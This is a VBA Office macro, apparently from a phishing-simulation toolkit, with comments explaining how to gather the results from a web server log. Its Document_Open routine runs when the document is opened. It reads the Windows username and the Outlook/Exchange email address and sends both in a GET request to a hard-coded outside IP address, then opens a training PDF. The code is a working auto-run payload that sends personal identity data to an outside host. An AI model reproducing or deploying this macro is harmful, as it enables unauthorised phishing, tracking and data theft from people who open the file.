'The following macro can be used to collect metrics for a phishing campaign. The macro appends the username and email address 
'of the target user to a query string and fires a get request to the specified target server. The formatted details can be 
'obtained from the access log of server using the following command.

'Sample Output:

'$ cat access.log | grep "grepusingthis" | awk -F '[ -]' '{print $1 "\t" $6 "\t" $7 "\t" $11 "\t" $12}'
'XXX.XXX.XXX.XXX   [24/Mar/2017:19:03:41   +0000]  user1 JohnDoe@Mydomain.com
'XXX.XXX.XXX.XXX   [24/Mar/2017:19:05:45   +0000]  user2 JaneDoe@Mydomain.com

'*The macro will work only on Windows systems.
'*The server used here is Apache2 on ubuntu 16.04. You may need to modify the commands to format the output if you are using 
'a different server.


Sub Document_Open()
MyStr = Environ("Username")
Dim User As String
Set OL = CreateObject("outlook.application")
Set olAllUsers = OL.Session.AddressLists.Item("All Users").AddressEntries
User = OL.Session.CurrentUser.Name
Set oentry = olAllUsers.Item(User)
Set oExchUser = oentry.GetExchangeUser()
mailaddr = oExchUser.PrimarySmtpAddress
Dim o
Dim NewStr As String
NewStr = "http://52.41.38.114/-grepusingthis-" + MyStr + "-" + mailaddr + "-&type=doc"
Set o = CreateObject("MSXML2.ServerXMLHTTP")
o.Open "GET", NewStr, False
o.send
Dim IE
Set IE = CreateObject("InternetExplorer.Application")
IE.navigate ("https://s3.amazonaws.com/phishingedu/Home+Office+December+2016+Teachable+Moment.pdf")
IE.Visible = True '
End Sub
